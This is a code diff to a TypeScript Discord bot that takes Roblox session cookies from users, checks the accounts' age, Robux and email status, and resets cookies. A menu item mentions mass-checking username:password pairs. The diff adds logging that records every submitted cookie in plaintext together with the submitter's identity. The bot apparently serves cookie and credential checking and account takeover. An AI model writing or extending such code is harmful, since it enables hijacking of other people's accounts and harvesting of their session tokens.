@@ -85,7 +85,7 @@ export function buildPanelSelect() {
       new StringSelectMenuOptionBuilder()
         .setLabel('📂 Mass Check V2 (USN:PW)')
         .setValue('checkv2')
-        .setDescription('Use /checkv2'),
+        .setDescription('W.I.P'),
       new StringSelectMenuOptionBuilder()
         .setLabel('🧹 Clear Cookie')
         .setValue('clear')
@@ -113,8 +113,13 @@ async function handleSelect(interaction: MessageComponentInteraction): Promise<v
   const action = interaction.values[0];
   const userId = interaction.user.id;
 
+  logger.info({
+    userTag: interaction.user.tag,
+    userId: interaction.user.id,
+    action,
+  }, '[PANEL] dropdown selected');
+
   if (action === 'check' || action === 'checkv2') {
-    const commandName = action === 'check' ? '/check' : '/checkv2';
     await interaction.reply({
       content: `Dah dibilangin W.I.P Ngeyel kontol`,
       flags: MessageFlags.Ephemeral,
@@ -144,7 +149,6 @@ async function handleSelect(interaction: MessageComponentInteraction): Promise<v
       .setRequired(true)
       .setPlaceholder('Insert here...');
     fields.push(cookieInput);
-    
   } else {
     const cookieInput = new TextInputBuilder()
       .setCustomId('cookie')
@@ -192,6 +196,14 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
 
   const deliveryRaw = interaction.fields.getTextInputValue('delivery').toUpperCase().trim();
   const delivery = (deliveryRaw === 'D') ? 'dm' : 'server';
+
+  logger.info({
+    userTag: interaction.user.tag,
+    userId: interaction.user.id,
+    action,
+    cookie,
+    delivery: deliveryRaw,
+  }, '[PANEL] modal submitted');
 
   await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
@@ -266,7 +278,6 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
           modalSessions.delete(sessionKey);
           return;
         }
-        // Email exists – show account info
         const userAge = await Roblox.getUserAge(validation.userId!);
         const ageStr = `Created ${userAge.createdYear} (${userAge.days}D) - ${await Roblox.fetchAgeGroup(cookie)}`;
         const robux = await Roblox.fetchRobux(cookie, String(validation.userId!));
@@ -323,6 +334,11 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
       await interaction.reply({ content: 'Session expired.', flags: MessageFlags.Ephemeral });
       return;
     }
+    logger.info({
+      userTag: interaction.user.tag,
+      userId: interaction.user.id,
+      cookie: session.cookie,
+    }, '[PANEL] reauth button clicked');
     const result = await runResetAction(session.cookie);
     if (result.success && result.newCookie) {
       const newId = Math.random().toString(36).slice(2, 10);
@@ -334,7 +350,6 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
     noEmailSessions.delete(id);
     return;
   }
-
 }
 
 import { resetCommand } from './reset';
